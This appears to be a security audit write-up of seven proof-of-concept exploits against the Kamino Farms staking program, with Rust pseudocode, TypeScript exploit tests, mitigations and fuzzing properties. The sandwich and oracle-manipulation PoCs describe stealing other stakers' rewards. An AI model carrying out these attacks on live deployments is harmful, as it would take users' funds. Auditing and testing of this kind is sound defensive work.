# Proof of Concept Exploits for Kamino Farms

## PoC 1: Division by Zero in Delegated Farms

### Vulnerability
When a delegated farm has `total_active_stake_scaled = 0` and rewards are being distributed, the program will panic due to division by zero.

### Attack Steps
```rust
// Step 1: Initialize a delegated farm
let farm = initialize_farm_delegated(
    delegate_authority: attacker_pubkey,
    ...
);

// Step 2: Add rewards to the farm
add_rewards(farm, reward_amount: 1000000);

// Step 3: Ensure no users have staked (total_active_stake_scaled = 0)

// Step 4: Call refresh_farm to trigger reward distribution
refresh_farm(farm); // PANIC HERE!

// Line 866 in farm_operations.rs:
// Decimal::from(rewards) / farm_state.total_active_stake_scaled
// When total_active_stake_scaled = 0, this causes division by zero
```

### Impact
- Complete DoS of the farm
- Funds locked in the protocol
- Unable to process any transactions for this farm

### Exploitation Code
```typescript
it("exploits division by zero in delegated farm", async () => {
  // Initialize delegated farm
  const farm = await program.methods
    .initializeFarmDelegated()
    .accounts({
      delegateAuthority: attacker.publicKey,
      // ... other accounts
    })
    .rpc();
  
  // Add rewards
  await program.methods
    .addRewards(new BN(1000000), new BN(0))
    .accounts({
      farm: farmPubkey,
      // ... other accounts
    })
    .rpc();
  
  // This will panic
  try {
    await program.methods
      .refreshFarm()
      .accounts({
        farm: farmPubkey,
      })
      .rpc();
    assert.fail("Should have panicked");
  } catch (e) {
    assert.include(e.toString(), "Program failed");
  }
});
```

---

## PoC 2: Delegated Stake Manipulation Attack

### Vulnerability
The `set_stake_delegated` instruction has no rate limiting or bounds checking, allowing rapid stake manipulation.

### Attack Scenario: Sandwich Attack
```rust
// Attacker is the delegate_authority for a farm with active rewards

// Step 1: Monitor mempool for harvest_reward transactions
monitor_mempool();

// Step 2: When victim's harvest_reward is detected:
// Front-run transaction:
set_stake_delegated(victim_user, new_stake: 0);  // Set victim stake to 0

// Step 3: Let victim's harvest transaction execute
// Victim gets 0 rewards because their stake is 0

// Step 4: Back-run transaction:
set_stake_delegated(attacker_user, new_stake: LARGE_AMOUNT);
harvest_reward(attacker_user);  // Attacker claims all rewards

// Step 5: Reset stakes
set_stake_delegated(victim_user, original_stake);
set_stake_delegated(attacker_user, 0);
```

### Exploitation Code
```typescript
it("exploits delegated stake sandwich attack", async () => {
  const victim = Keypair.generate();
  const attacker = delegateAuthority;
  
  // Setup: Create users and add rewards
  await initializeUser(victim);
  await initializeUser(attacker);
  await addRewards(1000000);
  
  // Set initial stakes
  await setStakeDelegated(victim, 1000);
  await setStakeDelegated(attacker, 0);
  
  // Wait for rewards to accumulate
  await sleep(1000);
  
  // Attack sequence
  // 1. Front-run: Zero out victim stake
  await setStakeDelegated(victim, 0);
  
  // 2. Set attacker stake high
  await setStakeDelegated(attacker, 10000);
  
  // 3. Harvest rewards as attacker
  const attackerRewards = await harvestReward(attacker);
  
  // 4. Victim tries to harvest (gets nothing)
  const victimRewards = await harvestReward(victim);
  
  assert(attackerRewards > 0, "Attacker got rewards");
  assert(victimRewards === 0, "Victim got no rewards");
});
```

---

## PoC 3: Reward Distribution Time Manipulation

### Vulnerability
When `total_active_stake_scaled = 0`, the protocol advances `last_issuance_ts` without distributing rewards, effectively losing them.

### Attack Steps
```rust
// Step 1: Stakes exist and rewards are accumulating
stake(user1, 1000);
add_rewards(10000);

// Step 2: All users unstake
unstake(user1, ALL);
// Now total_active_stake_scaled = 0

// Step 3: Time passes (rewards should accumulate but don't)
wait(3600); // 1 hour

// Step 4: Call refresh_farm
refresh_farm();
// last_issuance_ts is updated but no rewards distributed

// Step 5: User stakes again
stake(user1, 1000);

// Step 6: User harvests
harvest_reward(user1);
// User gets 0 rewards for the period when total_stake was 0
// Those rewards are permanently lost
```

### Impact
- Permanent loss of rewards
- Violation of reward conservation invariant
- Users lose expected rewards

---

## PoC 4: Oracle Price Manipulation

### Vulnerability
The protocol uses a single oracle price without sufficient validation, allowing price manipulation attacks.

### Attack Steps
```rust
// Assuming attacker can influence Scope oracle price

// Step 1: Manipulate oracle price downward
manipulate_oracle_price(token, price: 0.01);

// Step 2: Stake tokens when price is low
stake(attacker, large_amount);

// Step 3: Manipulate oracle price upward
manipulate_oracle_price(token, price: 100.0);

// Step 4: Trigger reward calculation with inflated price
refresh_farm();
// Rewards are calculated with inflated price:
// oracle_adjusted_amt = decimal_adjusted_amt * px / factor

// Step 5: Harvest inflated rewards
harvest_reward(attacker);

// Step 6: Unstake and exit
unstake(attacker, ALL);
```

### Exploitation Code
```typescript
it("exploits oracle price manipulation", async () => {
  // This assumes ability to influence Scope oracle
  // In practice, this might require flash loan attacks on the oracle's price sources
  
  const attacker = Keypair.generate();
  
  // Set low price
  await mockScopePrice(0.01);
  
  // Stake when price is low
  await stake(attacker, 10000);
  
  // Manipulate price up
  await mockScopePrice(100.0);
  
  // Refresh to trigger reward calculation with high price
  await refreshFarm();
  
  // Harvest inflated rewards
  const rewards = await harvestReward(attacker);
  
  // Rewards should be ~10000x higher than normal
  assert(rewards > normalRewards * 9000, "Got inflated rewards");
});
```

---

## PoC 5: Rounding Error Accumulation

### Vulnerability
Consistent use of `floor()` operations causes dust to accumulate in the protocol.

### Attack Steps
```rust
// Create many small stakes to maximize rounding errors

for i in 0..1000 {
    let user = create_user(i);
    stake(user, 1); // Minimum stake
}

// Add rewards that don't divide evenly
add_rewards(10001); // Prime number

// Each user's reward calculation:
// reward = floor((reward_per_share * stake))
// With stake = 1 and many users, rounding errors accumulate

for i in 0..1000 {
    harvest_reward(user[i]);
}

// Check remaining rewards in protocol
let remaining = get_rewards_available();
assert!(remaining > 0); // Dust remains due to rounding
```

### Impact Over Time
```typescript
it("demonstrates rounding error accumulation", async () => {
  const users = [];
  const DUST_PER_USER = 0.999; // Just under 1 token
  
  // Create 1000 users with tiny stakes
  for (let i = 0; i < 1000; i++) {
    const user = Keypair.generate();
    await initializeUser(user);
    await stake(user, 1);
    users.push(user);
  }
  
  // Add rewards that cause rounding
  await addRewards(1000 * DUST_PER_USER);
  
  // Each user harvests
  let totalHarvested = 0;
  for (const user of users) {
    const reward = await harvestReward(user);
    totalHarvested += reward;
  }
  
  // Significant dust remains
  const remaining = await getRewardsAvailable();
  console.log(`Dust accumulated: ${remaining} tokens`);
  assert(remaining > 0, "Dust accumulated in protocol");
});
```

---

## PoC 6: Reentrancy via Token Callbacks

### Vulnerability
While token transfers happen after state updates, there's no explicit reentrancy guard.

### Theoretical Attack (if using Token-2022 with transfer hooks)
```rust
// Custom token with transfer hook that calls back into protocol

impl TransferHook for MaliciousToken {
    fn on_transfer(&self, from: Pubkey, to: Pubkey, amount: u64) {
        if from == farm_vault {
            // Reenter the protocol
            cpi::harvest_reward(same_farm, same_user);
        }
    }
}

// Attack:
harvest_reward(user);
// 1. State updated: rewards_issued_unclaimed[user] = 0
// 2. Token transfer triggers hook
// 3. Hook reenters harvest_reward
// 4. Since state already updated, user could potentially harvest again
```

---

## PoC 7: Integer Overflow in Delegated Farms

### Vulnerability
Direct cast from u128 to u64 without proper checking in delegated farms.

### Attack Steps
```rust
// In set_stake for delegated farms:
let current_stake_amount: u64 = user_state
    .active_stake_scaled
    .try_into()
    .expect("Delegated farm: active stake don't fit on u64");

// If active_stake_scaled > u64::MAX, program panics

// Attack:
set_stake_delegated(user, u64::MAX);
// Internal representation becomes u128::from(u64::MAX)

// Manipulate to cause overflow:
// Through some operation that multiplies stake
// active_stake_scaled could exceed u64::MAX

// Next call to set_stake will panic
set_stake_delegated(user, any_value); // PANIC!
```

---

## Mitigation Summary

1. **Division by Zero**: Add zero-check before division
2. **Delegated Manipulation**: Add rate limiting and bounds checking
3. **Time Manipulation**: Distribute rewards proportionally even with zero stake
4. **Oracle Manipulation**: Add sanity checks and use TWAP
5. **Rounding Errors**: Implement dust collection mechanism
6. **Reentrancy**: Add explicit reentrancy guards
7. **Integer Overflow**: Use checked arithmetic everywhere

---

## Testing Recommendations

### Fuzzing Targets
```rust
#[cfg(test)]
mod fuzz_tests {
    use proptest::prelude::*;
    
    proptest! {
        #[test]
        fn fuzz_stake_amounts(amount in 0u64..=u64::MAX) {
            // Should never panic regardless of input
            let result = stake(user, amount);
            assert!(result.is_ok() || result.is_err());
        }
        
        #[test]
        fn fuzz_reward_distribution(
            stakes in prop::collection::vec(0u64..=1000000, 1..100),
            rewards in 1u64..=1000000000
        ) {
            // Invariant: sum(user_rewards) <= total_rewards
            setup_users_with_stakes(stakes);
            add_rewards(rewards);
            refresh_farm();
            
            let total_claimed = harvest_all_users();
            assert!(total_claimed <= rewards);
        }
    }
}
```

### Formal Verification Properties
```
// Properties to verify with formal methods:

property no_division_by_zero:
    forall farm_state, ts.
        refresh_global_reward(farm_state, ts) =>
            (farm_state.is_delegated && farm_state.total_active_stake_scaled > 0) ||
            !farm_state.is_delegated

property reward_conservation:
    forall farm_state, users.
        let total_distributed = sum(user.rewards_claimed for user in users)
        let total_added = sum(reward.amount for reward in add_reward_calls)
        total_distributed <= total_added

property monotonic_reward_accumulation:
    forall farm_state, ts1, ts2.
        ts2 > ts1 =>
            farm_state.reward_per_share_scaled(ts2) >= 
            farm_state.reward_per_share_scaled(ts1)
```

---

*End of Proof of Concepts Document*